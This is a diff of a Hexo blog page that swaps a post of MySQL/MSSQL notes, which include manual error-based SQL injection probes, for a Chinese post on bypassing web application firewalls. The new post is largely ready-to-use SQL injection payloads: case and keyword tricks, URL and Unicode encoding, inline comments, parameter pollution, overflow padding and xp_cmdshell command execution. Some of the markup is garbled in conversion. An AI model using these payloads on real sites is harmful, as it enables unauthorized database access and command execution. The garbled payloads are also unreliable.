@@ -8,7 +8,7 @@
     <link rel="apple-touch-icon" sizes="76x76" href="/null">
     <link rel="icon" type="image/png" href="/null">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
-    <title>mysql - Hexo</title>
+    <title>绕过waf技巧 - Hexo</title>
     
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
     
@@ -406,7 +406,7 @@ header .header__right .dropdown-menus .dropdown-menu {
 <article class="page">
 <div id="post-meta-m">
     <div class="post-meta" id="post-meta">
-  <h3>mysql</h3>
+  <h3>绕过waf技巧</h3>
     
       <span class="post-meta-label">
         John Doe
@@ -415,8 +415,8 @@ header .header__right .dropdown-menus .dropdown-menu {
     
       <span class="post-meta-label">
         <span class="p-dot"></span>
-        <time datetime="2022-03-15 17:33" pubdate>
-          2022-03-15
+        <time datetime="2022-04-13 09:30" pubdate>
+          2022-04-13
         </time>
       </span>
     
@@ -424,7 +424,7 @@ header .header__right .dropdown-menus .dropdown-menu {
       
       <span class="post-meta">
         <span class="p-dot"></span>
-        共 828 字
+        共 1.5k 字
       </span>
     
     
@@ -440,13 +440,18 @@ header .header__right .dropdown-menus .dropdown-menu {
   </div>
     <div id="article">
       <div id="post-content" class="markdown-body textretty">
-        <p>mysql<br>总结:常用数据类型<br>分类                备注和说明                    数据类型                说明<br>二进制数据类型    存储非子符和文本的数据        BLOB            可用来存储图像<br>文本数据类型        字符数据包括任意字母、符        char                固定长度的非 Unicode字符数据<br>   号或数字字符的组合               varchar               可变长度非Unicode数据<br>text                存储长文本信息<br>日期和时间        日期和时间在单引号内输入        time                时间<br>date                日期<br>datetime            日期和时间<br>数值型数据        该数据仅包含数字，包括正        int                整数<br>   数、负数以及浮点数               smallint<br>float                浮点数<br>double</p>
-<p>数值列类型<br>·所有数值列类型的类型名及其说明和所占的字节数见下表<br>类型名            说明                类型名            说明<br>TINYINT            非常小的整数        BIGINT            大整数<br>SMALLINT        较小的整数        FLOAT            单精度浮点数<br>MEDIUMINT        中等大小的整数    DOUBLE            双精度浮点数<br>INT                标准整数            DECIMAL            一个串的浮点数</p>
-<p>update test_table set name=”dss” where name=”dcl”;<br>delete from test_table where address2&gt;77;<br>insert into test_table(name,address2) values(“sss”,152436),(“sss”,55),(“sss”,77)<br>查询语句<br>SELECT〈&lt;列名&gt;FROM&lt;表名&gt;[WHERE&lt;查询条件表达式&gt;][ORDER BY&lt;排序的列名&gt;[ASC或DESC]</p>
-<p>PHP访问MySQL数据库的流程第一步:连接MySQL服务器<br>·使用mysql connect)函数建立与MySQL服务器的连接第二步:选择MySQL数据库<br>·使用mysql_select db)函数选择MySQL数据库服务器上的数据库，并与数据库建立连接第三步:执行SQL语句<br>·在选择的数据库中使用mysql query)函数执行SQL语句。对数据的操作方式主要包括4种方式:<br>数据操作                                说明<br>查询数据                        使用select语句实现数据的查询功能<br>插入数据                        使用insert into语句向数据库中插入数据<br>更新数据                        使用update语句修改数据库中的记录<br>删除数据                        使用delete语句删除数据库中的记录</p>
-<p>PHP代码<br>连接数据库服务器              mysql_connect函数!<br>选择数据库                  mysql_select_db函数;<br>操作表(查询/插入/修改/删除            含SQL语句的mysql_query函数<br>返回操作结果            mysql_fetch_array函数+edho等<br>关闭数据库连接            mysql_close函数</p>
-<p>Ms5q量本史用<br>MSSql的基本语句:<br>创建数据库:CREATE DATABASE [dbname]<br>删除数据库 :drop database [dbname]<br>创建新表:create table [tablename] ( name char(10), age tiryint, sex int )<br>删除新表;drop table [tablename]<br>向表中插入内容:insert into <a href="field1,field2">tablename</a> values(value1,value2)<br>删除内容:delete from [tablename] where范围<br>更新内容:update [tablename] set field1=valuel where范围查找: select * from [tablename] where field1=” ichunqiu”</p>
-<p>MSSql手工注入的过程（利用报错注入)<br>I<br>1、判断注入点∶<br>·语句:[ id=1’]<br>            [ id=1 and 1=1]返回正常<br>            [ id=1 and 1=2]返回错误<br>2、判断是否为MSSQL数据库:<br>·语句:  [ id=1 and exists(select * from sysobjects)]】返回正常为mssql<br>       [ id=1 and exists (select count(*) from sysobjects)]用法和上面的相同<br>3、判断数据库版本号:<br>·语句:[ id=1 and @@version&gt;0 ]<br>·说明:@@version是mssql的全局变量，如果我们把它写成这样and @@version&gt;0那个后面的mssql就会强行@version强行转换成数字但是失败，所以就会将数据库信息暴露出来<br>·版本号: nt5.2 : win2003nt6.1 : win7</p>
+        <p>常见的过WAF技巧<br>1．大小写绕过∶<br>·大小写绕过用于只针对小写或大写的关键字匹配技术<br>·出现原因:在waf里，使用的正则不完善或者是没有用大小写转换函数·用法:比如，拦截了union，那就使用uNIoN<br>XXx.com/index.php?id=-3 uNIoN sELect 1,2,3<br>·注意:对于一些不太成熟的WAF效果显著</p>
+<p>2．替换关键字∶<br>关键字双写<br>·出现原因∶利用waf的不完整性，只验证一次字符串或者过滤的字符串并不完整。·用法∶<br>XXX.Com/index.php?id=-3 UNION SELECT 1,2,3<br>·注意:有些时候甚至构造更复杂，如:SeLSeselectleCTecL</p>
+<p>3替换关键字∶<br>同价词替换<br>·出现原因:WAF主要是针对一些特殊的关键词进行检测<br>·用法︰<br>    and和or不能使用:&amp;&amp;和Ⅱ 代替and和or<br>    =不能使用的情况:可以尝试&lt;、&gt;代替<br>    ·空格不能使用（常见）︰%20 %09 %0a %0b %Oc %Od %a0/**/ 代替空格<br>·注意:在mysql中%0a是换行，可以代替空格，这个方法也可以部分绕过最新版本的安全狗</p>
+<p>4.特殊字符拼接<br>·出现原因:把特殊字符拼接起来绕过WAF的检测<br>·用法︰如在函数里可以用+来拼接，在Mysql中可以利用注释/**/绕过<br>    xxx.com/index.php?id=1;exec(master..xp_cmdshell ‘net user’)<br>特殊字符拼接<br>     xxx.com/index.php? id=1; exec(‘maste’+’r..xp’+’_cmdshell’+’”net user”‘)</p>
+<p>5.编码绕过:<br>·对一些字符进行编码，常见的SQL编码有unicode、HEX、URL、ascll、 base64等URL编码·出现原因:利用浏览器上的进制转换或者语言编码规则来绕过waf<br>URL编码<br>·输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为%20、单引号%27、左括号%28等·注意:如果URL编码只进行了一次过滤，可以用两次编码绕过<br>·用法∶<br>index.php?id=1/<strong>/UNION/</strong>/SELECT 1,2,3<br>URL编码<br>index.php?id=1%2f%2a%2a%2f%75%6e%69%6f%6e%2f%2a%2a%2f%73%65%6c%65%63%74%20%31%2c%32%2c%33%0a<br>Unicode编码<br>·常用符号的Unicode编码︰<br>单引号: %u0027空格:%u0020左括号:%u0028右括号:%u0029<br>用法︰<br>index.php?id=1 union select 1,2,3<br>Unicode编码<br>index.php?id=1 un%u0069on sel%u0065ct 1,2,3</p>
+<p>6.注释绕过:<br>·常见的用于注释的符号∶//、–、/<strong>/、#、–+、—、 ;、–a·出现原因∶利用语言函数特性来绕过waf的规则<br>普通注释<br>. /*/在构造的查询语句中插入注释，规避对空格的依赖或关键字识别。·用法︰<br>index.php?id=1 UNION SELECT 1,2,3<br>普通注释<br>index.php?id=1/</strong>/UNION/**/SELECT 1,2,3</p>
+<p>注释绕过:内联注释<br>·相比普通注释，内联注释用的更多，它有一个特性/!<em><em>/只有MySQL能识别(/</em>!<em>/表示注释里面的语句会被执行)<br>·用法∶采用/</em>! code <em>/来执行我们的SQL语句，内联注释可以用于整个SQL语句中<br>·举例:过滤器过滤了如下内容union,where, table name, table schema, =, and information schema，这些都是我们内联绕过需要绕过的目标<br>id=1 union select 1,2,concat(table name) from information schema.tables where table schema =database()<br>内联注释<br>id=1/</em>!UnIoN*/+SeLeCT+1,2,concat(/<em>!table_name</em>/)+FrOM/*!information schema</em>/.tables /<em>!WHERE</em>/+/<em>!TaBIE..ScHeMa</em>/+like+database()<br>·注意︰/<em>!50001 select * from test</em>/的含义︰表示假如数据库是5.00.01以上版本，该语句才会被执行</p>
+<p>7.参数污染:·案例:<br>ModSecurity过滤器会将类似于select1,2,3 from table这类的语句归类为黑名单<br>当web服务器遇到类似/index.aspx?id=select 1,2,3 from table这样的语句时，会阻断请求<br>但是这个web服务器在遇到为同一个参数赋值不同数值时，会将它们连接起来，攻击者通过这个方法来绕过黑名单<br>·例如︰<br>想要执行的语句:/index.aspx?id=select 1,2,3 from table<br>参数污染<br>提交的URL : /index.aspx?id=select 1&amp;id=,2,3 from table<br>·说明∶1、这不属于黑名单中的模式，不会触发黑名单的拦截功能<br>2、由于WEB程序会采取连接操作，即将&amp;符号前后的内容个连接，因此SQL注入行为能够被执行</p>
+<p>8.缓冲区溢出∶<br>·缓冲区溢出用于绕过WAF，许多WAF是C语言写的，而C语言自身没有缓冲区保护机制·因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过例如︰<br>?id=1 and (select 1)=(Select OxAAAAAAAAA<em>1000 more A)+UnIoN+SeLeCT+1,2,version0),4,5,database(),user),8,9,10–+<br>·说明︰示例OxA</em>1000指OxA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长<br>度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出。</p>
+<p>9.分块传输绕过:<br>·举例∶使用分块传输，将id=1 and 1=2进行分块，成功绕过了安全狗<br>·注意︰分块传输需要将关键字and,or,select ,union等关键字拆开，不然仍然会被waf拦截。编码过程中长度<br>需包括空格的长度。最后用0表示结束，并在0后空两行表示数据包结束</p>
+<p>整合绕过:<br>·整合的意思是结合使用前面的各种绕过技术，单一的技术可能无法绕过过滤机制，但多种技术的配合使用成功的可能性会增加<br>·多种技术的使用增加了更多的可能性，除非每一种技术单独都无法使用，否则它们能大大增加绕过的成功性例如︰<br>id=1/<em>IUnIoN</em>/+SeLeCT+1,2,concat(/<em>!table_name</em>/)+FrOM<br>/<em>!information_schema</em>/.tables /<em>!WHERE</em>/+/<em>!TaBIE_ScHeMa</em>/+ like+database()</p>
+<p>?id=1+/<em>!UNION</em>/+/<em>!SELECT</em>/+1,GrOup_COnCaT(COLUMN_NAME),3,4-5+FROM+/<em>!INFORMATION_SCHEM</em>/.COLUMNS+WHERE+TABLE_NAME=Ox41646d696e–</p>
 
       </div>
     </div>
